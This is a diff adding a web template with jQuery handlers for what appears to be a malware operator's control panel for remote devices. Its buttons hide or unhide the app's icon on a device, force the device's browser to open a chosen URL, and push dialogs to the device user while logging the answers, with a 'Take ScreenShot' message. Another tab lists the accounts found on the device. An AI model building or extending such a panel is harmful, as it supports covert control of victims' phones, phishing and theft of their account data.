@@ -1,0 +1,270 @@
+
+
+<div class="ui top attached tabular inverted white menu" style="
+    margin-left: 0!important;
+    margin-right: 0!important;">
+    <a class="item active" data-tab="other">
+        other
+    </a>
+    <a class="item" data-tab="dialog">
+        Dialog
+    </a>
+    <a class="item" data-tab="accounts">
+        Accounts
+    </a>
+
+</div>
+
+<div class="ui bottom attached tab segment active" data-tab="other">
+
+    <div class="ui secondary inverted menu" style="
+        margin-left: 0!important;
+        margin-right: 0!important;">
+        <div class="right menu">
+
+            <button onclick="updateButton(this, '0xIF')" class="ui inverted green button"> <i
+                class="icon sync"></i>Update info</button>
+        </div>
+    </div>
+
+    <% let hideApps;
+    pageData.forEach((item) => { 
+        if(item.hideApp !== undefined) 
+            hideApps = item.hideApp; %>
+
+    <% }) %>
+    <button onclick="Hide(this,true)" class="ui blue button" <% if(hideApps ==2 ){ %> disabled <% } %> > Hide App</button>
+    <button class="ui blue button" <% if(hideApps ==0 || hideApps ==1 ) { %> disabled <% } %> onclick="Hide(this,false)" > UnHide App</button>
+
+    <div class="ui action input">
+      <input type="text" placeholder="url" id="url">
+
+      <button class="ui button positive" onclick="OpBrow(this)">
+            Open
+        </button>
+    </div>
+
+    
+
+    <!---<button class="ui inverted red button" disabled onclick="deleteApp(this)"> Delete</button> -->
+
+</div>
+
+
+<!--dialog -->
+<div class="ui bottom attached tab segment" data-tab="dialog">
+    <div>
+        <div class="ui labeled input fluid">
+            <div class="ui label">
+                Title
+            </div>
+            <input id="title" type="text" autocomplete="off">
+        </div>
+        <div class="ui labeled input fluid">
+            <div class="ui label">
+                Msg
+            </div>
+            <input id="msg" type="text" autocomplete="off">
+        </div>
+        <button class="ui button fluid positive" type="submit" onclick="OpDialog(this)">
+            Send
+        </button>
+    </div>
+    
+
+    <table class="ui sortable celled table">
+        <thead>
+            <tr>
+                <th>Date</th>
+                <th>Title</th>
+                <th>Msg</th>
+                <th>Answer</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { 
+                if(item.type !== "dialog") return;
+                let date = new Date(parseInt(item.date)); %>
+            <tr>
+                <td class="collapsing"><%= date.toLocaleString('ru-RU', { timeZone: 'Asia/Yekaterinburg' }) %></td>
+                <td><%= item.title %></a></td>
+                <td><%= item.msg %></td>
+                <td><%= item.otv %></td>
+            </tr>
+            <% }) %>
+
+        </tbody>
+    </table>
+</div>
+
+<!--user accounts -->
+<div class="ui bottom attached tab segment" data-tab="accounts">
+    <div class="ui secondary inverted menu" style="
+        margin-left: 0!important;
+        margin-right: 0!important;">
+        <div class="right menu">
+            <button onclick="updateButton(this, '0xGA')" class="ui inverted green button"> <i
+                class="icon sync"></i>Get\Update</button>
+        </div>
+    </div>
+
+    <table class="ui sortable celled table">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Type</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { 
+                if(item.type !== undefined && item.type !== "account") return; %>
+            <tr>
+                <td><%= item.Aname %></a></td>
+                <td><%= item.Atype %></td>
+            </tr>
+            <% }) %>
+
+        </tbody>
+    </table>
+
+</div>
+
+
+<script type="text/javascript">
+    $('.menu .item').tab();
+    $('table').tablesort();
+
+    function Hide(element,param) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+
+            sendCommand('0xOHAI', {
+                'hide': param
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+
+                            window.location = window.location;
+
+                            showNotification('#2ecc71', 'SUCCESS');
+                        }, 300)
+                    }
+                }
+            });
+    }
+
+    function OpDialog(element) {
+        $(element).children().css("opacity", "0");
+        $(element).addClass('green');
+        $(element).addClass('loading');
+        $('.dlop').addClass('disabled');
+        
+        sendCommand('0xOOD', {
+            'action':'OpenDialog',
+            'title': document.getElementById("title").value,
+            'msg': document.getElementById("msg").value
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green');
+                    $(element).removeClass('loading');
+                    $('.dlop').removeClass('disabled')
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+
+                        window.location = window.location;
+
+                        showNotification('#2ecc71', 'Take ScreenShot');
+                    }, 300)
+                }
+            }
+        });
+    }
+
+    function OpBrow(element) {
+        $(element).children().css("opacity", "0");
+        $(element).addClass('green');
+        $(element).addClass('loading');
+        $('.dlop').addClass('disabled');
+        
+        sendCommand('0xOOB', {
+            'action': 'OpenBrowser',
+            'url': document.getElementById("url").value
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green');
+                    $(element).removeClass('loading');
+                    $('.dlop').removeClass('disabled')
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+
+                        window.location = window.location;
+                    }, 300)
+                }
+            }
+        });
+    }
+
+    function deleteApp(element){
+        $(element).children().css("opacity", "0");
+        $(element).addClass('green');
+        $(element).addClass('loading');
+        $('.dlop').addClass('disabled');
+        
+        sendCommand('0xOD', (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green');
+                    $(element).removeClass('loading');
+                    $('.dlop').removeClass('disabled')
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled')
+
+                        window.location = window.location;
+                    }, 300)
+                }
+            }
+        });
+    }
+
+</script>
